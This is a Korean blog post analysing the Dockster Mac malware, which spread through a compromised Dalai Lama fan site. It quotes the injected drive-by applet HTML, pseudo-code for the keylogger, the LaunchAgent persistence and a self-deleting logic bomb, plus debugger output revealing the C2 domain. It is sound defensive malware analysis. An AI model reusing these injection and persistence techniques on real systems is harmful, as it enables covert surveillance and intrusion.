---
layout: post
title: 'APT: OSX/Dockster analysis (Part I)'
date: 2014-01-28 18:39:41.000000000 +09:00
type: post
published: true
status: publish
categories:
- Malware Analysis
- OS Artifacts
tags:
- APT
- Mac OS X
- malware analysis
author: "n0fate"
---
<h2><span style="line-height: 1.5em;">1. 시작</span></h2>
<p>2012 4월에 60만대의 Mac을 감염시킨 flashback이 나타난지 6개월 후,  JAVA 취약점을 이용하여 공격하는 신종 악성코드가 발견되었다. 그 이름은 Dockster로, 발견 당시 이 악성코드가 이슈가 됐던 이유는 자바 취약점을 이용한 다중 운영체제(Windows, Mac OS X) 공격도 있었지만, 국가간 정치적인 이슈가 관여했다는 점이 더 컸다. 이 정치적 이슈는 다름아닌 중국과 티벳간의 분쟁이였다.</p>
<p><a href="http://4.bp.blogspot.com/-A4WbpH2LFSk/TwYhXTRynrI/AAAAAAAAMe4/zy6-yOIhfAQ/s1600/gma_wonders_china_tibet_ssh.jpg"><img class="aligncenter" alt="" src="{{ site.baseurl }}/assets/gma_wonders_china_tibet_ssh.jpg" width="531" height="411" /></a></p>
<p>중국은 정치적인 이유로 자치권을 가지는 티벳을 중국의 일부라고 주장하며 침략하였고, 티벳은 독립시위를 하며 자기자신을 독립국이라고 전세계에 어필하였다. 하지만 중국은 국제사회의 비난에도 불구, 티벳 인구의 10만여명을 사살하였다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/tibetanactivists_wideweb__470x3210.jpg"><img class="aligncenter size-full wp-image-743" alt="Riot policemen try to detain Tibetan activists protesting outside the China embassy in Kathmandu" src="{{ site.baseurl }}/assets/tibetanactivists_wideweb__470x3210.jpg" width="470" height="321" /></a></p>
<p>티벳에는 종교적/정치적 지도자가 있었으니, 이는 달라이 라마(Dalai Lama)라 불린다. 한국어로 해석하면 스승 또는 대사라 불리우며, 지금까지 14명의 대사가 있었다. 현재는 중국의 침략을 피해 1959년 인도로 망명한 달라이 라마 14세인 텐진 갸초가 달라이 라마이다. 참고로 텐진 갸초는  1989년에 노벨평화상을 받기도 한 인물이다.</p>
<p>[fusion_builder_container hundred_percent="yes" overflow="visible"][fusion_builder_row][fusion_builder_column type="1_1" background_position="left top" background_color="" border_size="" border_color="" border_style="solid" spacing="yes" background_image="" background_repeat="no-repeat" padding="" margin_top="0px" margin_bottom="0px" class="" id="" animation_type="" animation_speed="0.3" animation_direction="left" hide_on_mobile="no" center_content="no" min_height="none"][caption id="" align="aligncenter" width="458"]<a href="http://cfile218.uf.daum.net/original/1972A9044C167CA620562F"><img class=" " alt="" src="{{ site.baseurl }}/assets/1972A9044C167CA620562F" width="458" height="685" /></a> 텐진갸초[/caption]</p>
<p>Dockster는 이러한 상황에서 티벳을 겨냥한 사이버 공격이였다. 이 악성코드는 2012년 10월 5일 gyalwarinpoche.com 이라는 사이트에서 최초 발견되었으며, 자바 애플릿 취약점을 활용하여 웹사이트 접속 시점에 익스플로잇 발생으로 특정 악성코드를 실행시키는 "drive by java applet" 공격을 수행하였다. 최종 분석을 해보면, Dockster는 14대 달라이 라마인 텐진갸초를 공격 대상으로 삼은 것을 알 수 있는데, 그 근거는 다음과 같다.</p>
<p>1. 달라이라마 팬사이트에 자바 취약점을 삽입 : gyalwarinpoche.com은 원래 달라이라마에 관련된 자료를 올리는 사이트로 공격자는 이 사이트를 공격한 다음 자바 애플릿을 코드에 삽입하였다.</p>
<pre class="lang:js decode:true" title="injected code">&lt;html&gt;
&lt;body&gt;
&lt;applet width=10 height=10 code=a.class archive=destmac.jar&gt;&lt;/applet&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;body&gt;
&lt;TITLE&gt;gylwainpoche&lt;/TITLE&gt;
&lt;APPLET CODE=bbb.class archive=install.jar WIDTH=200 HEIGHT=100&gt;&lt;/APPLET&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
<p>2. Mac OS X용 악성코드를 내장하고 있다. Dockster는 PowerPC 및 Intel x86 아키텍처 기반에서 실행할 수 있는 Mac OS X용 악성코드이다. 2012년은 Mac OS X Lion이 공개된 시점이니 대부분의 맥에서 작동 가능하다고 볼 수 있다. 보통은 공격하기 위해 윈도우용 악성코드를 개발할텐데 왜 이 공격자는 맥용 악성코드를 만들었을까? 그 이유는 다음 한장의 사진으로 설명이 된다.</p>
<p><img class="alignnone aligncenter" alt="" src="{{ site.baseurl }}/assets/Dalai_Lama_Mac.jpg" width="806" height="621" /></p>
<p><span style="line-height: 1.5em;">즉, 이 공격은 Tibet, 그 중에서도 달라이 라마를 타겟으로 정교하게 구성된 APT 공격인 것이다. 이제 이 악성코드가 어떤 기능을 가지고 있는지 연재로 다뤄보고자 한다.</span></p>
<p>&nbsp;</p>
<h2>2. 분석</h2>
<p>여기에서 확보한 악성코드는 자바 애플릿 인젝션에 사용된 destmarc.jar 파일이다.</p>
<pre class="lang:sh decode:true" title="malware hash">$ md5 destmarc.jar
MD5 (destmarc.jar) = 5415777db44c8d808ee3a9af94d2a4a7</pre>
<p>jar 파일을 Java Decompiler(JD-GUI)로 확인하면, a.class 파일이 다음과 같이 작성되어 있다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-28-at-5.47.36-PM.png"><img class="aligncenter size-full wp-image-744" alt="JAVA-2012-0507" src="{{ site.baseurl }}/assets/Screen-Shot-2014-01-28-at-5.47.36-PM.png" width="686" height="331" /></a></p>
<p>저 바이트 배열은 전형적인 JAVA-2012-0507 취약점이다. 실제로 init 메서드의 smali 코드를 보면 AtomicReferenceArray 클래스를 이용하는 것을 볼 수 있다. 결국 이 악성코드는 자바 취약점을 이용하여 jar 파일 내부에 있는 file.tmp을 드롭하여 실행한다. 그러면 실제 악성 행위를 하는 file.tmp를 확인해보겠다.</p>
<pre class="lang:sh decode:true" title="file command on dockster">$ file file.tmp
file.tmp: Mach-O universal binary with 2 architectures
file.tmp (for architecture ppc):	Mach-O executable ppc
file.tmp (for architecture i386):	Mach-O executable i386</pre>
<p>이 악성코드는 Power PC용과 Intel x86용으로 빌드된 Mach-O 파일을 보유하는 유니버셜 바이너리(Universal Binaries)이다. Power PC는 거의 사용되지 않으며, 특히 달라이 라마가 사용하는 맥북 모델을 봤을 때 인텔 아키텍처를 사용했으므로  i386 아키텍처를 대상으로 분석을 진행하겠다. file.tmp는 xCode로 작성된 프로그램이지만 거의 대부분의 코드가 posix API를 이용하였다. 그리고 주요 데이터 및 모든 통신을 암호화하기 위해 내부적으로 <a href="https://github.com/mort666/RSAEuro" target="_blank">RSAEuro Toolkit</a>을 사용하고 있다. 이 툴킷은 오픈소스이며, 대부분의 암호화 기능이 내장되어 있다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/rsaeuro.png"><img class="aligncenter size-full wp-image-745" alt="rsaeuro toolkit" src="{{ site.baseurl }}/assets/rsaeuro.png" width="513" height="116" /></a></p>
<p>또한 중간중간 중국어 문자열이 있는 것으로보아, 중국어를 사용하는 국가에서 개발했을 가능성이 높다고 볼 수 있다. 본 악성코드는 xCode에서 생산된 바이너리의 전형적인 실행 구조를 띄는데, start-&gt;_start-&gt;_main 순서로 호출하며, 실제로는 _main 함수(main함수)가 공격을 수행하는 핵심 코드라 보면 된다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/main-function.png"><img class="aligncenter size-full wp-image-746" alt="main function" src="{{ site.baseurl }}/assets/main-function.png" width="556" height="624" /></a></p>
<p>이 함수의 주요 기능을 Pseudo-Code로 작성하면 다음과 같다. 이미 분석을 다 끝내고 작성하기 때문에 주석을 통해 대략적인 기능을 파악할 수 있을 것이다.</p>
<pre class="lang:default decode:true">typedef struct _config_file {
     int* unknown;
     short dummy;
     short sleeptime;
     time_t bomb_time;
} config_file; // 설정 파일의 데이터 구조체

int main()
{
     char* arg1 = argv[/fusion_builder_column][fusion_builder_column type="1_1" background_position="left top" background_color="" border_size="" border_color="" border_style="solid" spacing="yes" background_image="" background_repeat="no-repeat" padding="" margin_top="0px" margin_bottom="0px" class="" id="" animation_type="" animation_speed="0.3" animation_direction="left" hide_on_mobile="no" center_content="no" min_height="none"][1];
     if (strstr(arg1, “key”) // 첫 번째 인자가 key면,
     {
          RunKeyLogger(); // 키로거 실행
          return 0;
     }

     if ( !datahh())
     {
          // configuration file 디코딩
     }

     char* g_path = “[MALWARE_FULL_PATH]”; // 환경변수에서 가져온 악성코드 경로
     gethostkey(g_mac, 18); // mac address를 가져옴 (xx:xx:xx:xx:xx) 추 후 감염된 시스템 ID로 사용.

     if(config_file.dummy)
     {
          ExeInstall::ExeInstall(); // 사용자의 로그인 시 자동 실행(LaunchAgent) 경로를 생성하고, “.Dockset”이라는 문자열 생성
          if(time(0) &gt; config_file.bomb_time) // 시간이 2013년 4월 13일 0시 36분 19초(UTC+0)를 넘어간다면,
          {
               ExeInstall::DefaultUnInstalll(); // 자동 실행 제거 및 복사한 악성코드 제거
               // 프로그램 종료
          }
     }

     if (!strncmp(“working”, g_path, 8)) // g_path의 명칭이 working이라면
     {
          g_isfirstrun = 0;
     }
     else // working 이 아니라면,
     {
          ExeInstall::ExeInstall();
          if (strncmp(“first”, g_path, 6)) // first가 아니라면, 즉 인자 없이 최초 실행이라면
          {
               ExeInstall::DefaultInstall(); // man.Dockset.deman.plist에 first를 인자로 주어 설치
               // 완료되면 launchctl로 해당 plist를 로드 함. 이를 통해 서비스로 로드될 수 있음.
               return 0;
          }
          g_isfirstrun = 1;
          ExeInstall::SetWorking(); // LaunchAgent에 등록한 plist의 인자를 “working”으로 변경
     }

     if (configinit()) // 포트 정보를 복호화함.
     {
          if(g_isfirstrun) // 처음 실행이라면
          {
               if(config_file.dummy &amp; 2)
                    sleep(3600 * config_file.sleeptime);
               else
                    sleep(1);
          }
          pthread_create(null, null, RunKeyLoggerThread, null); // thread 형태로 "./Dockset key" 실행
          mainD(); // 공격자 시스템과 교신 및 키로거 데이터 전송 등 RAT 기능 수행
     }
     return 0;
}</pre>
<p>이 Pseudo-Code를 보면, 다음과 같은 주요 특징을 뽑아볼 수 있다.</p>
<ul>
<li>하나의 악성코드가 뒤에 붙는 인자에 따라 다른 임무를 수행</li>
<li>MAC Address로 감염된 디바이스 분류</li>
<li>키로깅 기능을 수행('key')</li>
<li>최초 실행 시 자동 실행에 등록함</li>
<li>통신에 필요한 데이터 암호화(IP, Port 등)</li>
<li>특정 시간(2013년 4월 13일)이 지나면 자기 자신을 삭제하고 종료</li>
<li>공격자와 교신(C2) 및 RAT 기능을 수행</li>
</ul>
<p>본 포스팅에서는 _main 함수에 대한 내용만 기술할 예정이고 나머지 기능은 별도 포스팅으로 다룰 예정(총 3개의 포스팅)이므로 '특정 시간이 지나면 자신을 삭제하고 종료'하는 부분만 올리도록 하겠다. 이 악성코드가 최초 실행되면, 첫 번째인자 값이 'key'인지 확인한다. 이는 추 후 키로깅 기능에서 설명할 예정이다. 자바 애플릿으로 실행될 때는 별도의 인자를 붙이지 않으므로, 이 부분은 건너 뛰게 되고, datahh() 및 rebyte()로 설정 정보가 저장된 config_file 구조체를 디코딩한다. 디코딩은 바이트를 쉬프트하는 등의 단순 연산을 수행한다. 실제 분석에서는 디버거를 이용했으므로, 이 부분은 세부적으로 분석하진 않았다. 이 과정이 완료되면 gethostkey() 함수로 여러 감염된 호스트에 식별자를 부여하기 위한 값을 추출한다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/gethostkey-function.png"><img class="aligncenter size-full wp-image-747" alt="gethostkey function" src="{{ site.baseurl }}/assets/gethostkey-function.png" width="746" height="468" /></a></p>
<p>이 함수는 내부적으로 system() API를 이용하여 이더넷 장치의 MAC 주소를 추출(예를 들어, "ether xx:xx:xx:xx:xx")하고, 출력 값을 dup2를 이용하여 입력으로 받아서 거기에서 맨 앞에 보이는 "ether"를 제거한다. 결국 순수한 MAC 주소만 남게 된다. 이러한 과정을 거치면, 자동 로그인 설정을 위한 ExeInstall 클래스를 선언하고 현재 시간 정보를 time(0) 함수로 가져와서 config_file 구조체의 시간정보와 비교한다. 이 시간 정보는 디스어셈블러로는 명시적으로 확인할 순 없으나, 디버거를 이용하면 손쉽게 확인할 수 있다.</p>
<pre class="lang:default decode:true" title="logic bomb">// lldb
(lldb) x/4xb 0x17e54+8
0x00017e5c: 0x83 0xa8 0x68 0x51
(lldb)

// python
Python 2.7.5 (default, Aug 25 2013, 00:04:04)
[GCC 4.2.1 Compatible Apple LLVM 5.0 (clang-500.0.68)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import time
&gt;&gt;&gt; time.gmtime(0x5168a883)
time.struct_time(tm_year=2013, tm_mon=4, tm_mday=13, tm_hour=0, tm_min=36, tm_sec=19, tm_wday=5, tm_yday=103, tm_isdst=0)
&gt;&gt;&gt;</pre>
<p>UTC+0를 기준으로 봤을 때 2013년 4월 13일 00시 36분 19초라는 값을 얻을 수 있으며, 악성코드가 이 시간 이후에 실행된다면, 아무런 행동을 하지 않는다. 아직까지 왜 이시간을 기준으로 했는지는 확인되지 않고 있다.</p>
<p>악성코드가 이 시간 전에 실행됐다면,  인자가 working인지 그리고 first인지를 확인한다. 아무런 인자가 없다면, ExeInstall 클래스의 DefaultInstall()로 악성코드를 자동 실행에 등록하고 자기 자신을 종료한다. 이 악성코드는 인자를 이용한다는 점이 재밌는데, 마치 여러 악성코드가 돌아가는 것처럼 구성하였으며, 자신이 최초 실행됐을 때와 두 번째 실행되었을 때, 키로깅을 시도할 때의 인자 값을 다르게 주어서 다른 행동을 할 수 있게 만들었다. DefaultInstall 메서드를 실행하면 결국 악성코드는 자기자신을 "$HOME/.Dockset"으로 복사하고, 원본 파일을 삭제한 후, 복사한 악성코의 인자를 'first'로 주어 실행한다.</p>
<p>'first'의 경우와 'working'의 경우는 크게 다르지 않은데, configinit() 함수로 AES로 암호화된 접속할 서버 주소와 포트 정보를 복호화한 후, pthread_create()로 키로거를 실행한다. 그리고 마지막으로 공격자 시스템과 교신 및 RAT을 수행하기 위한 mainD() 함수를 실행한다. 접속할 서버의 IP와 포트 정보도 디버거로 확인할 수 있다.</p>
<pre class="lang:default decode:true" title="IP, Port 추출">(lldb) x/2xb 0x160c0
0x000160c0: 0x98 0x1f
(lldb) x/1xs 0x160c2
0x000160c2: "itsec.eicp.net"
(lldb)</pre>
<p>도메인이 실제로 C2 서버의 역할을 하며 해당 서버는 미국에 위치하고 있으나, 몇몇 사람들의 말에 따르면 중국인이 실제로 서버를 관리하고 있다고 한다.</p>
<p><a href="http://forensic.n0fate.com/wp-content/uploads/2014/01/Screen-Shot-2014-01-28-at-6.34.13-PM.png"><img class="aligncenter size-full wp-image-748" alt="domain" src="{{ site.baseurl }}/assets/Screen-Shot-2014-01-28-at-6.34.13-PM.png" width="853" height="508" /></a></p>
<p>이 글에서는 대략적인 Dockster의 기능을 알아보았다. Part II에서부터는 각각의 기능에 대해 세부적으로 알아보도록 하겠다.[/fusion_builder_column][/fusion_builder_row][/fusion_builder_container]</p>
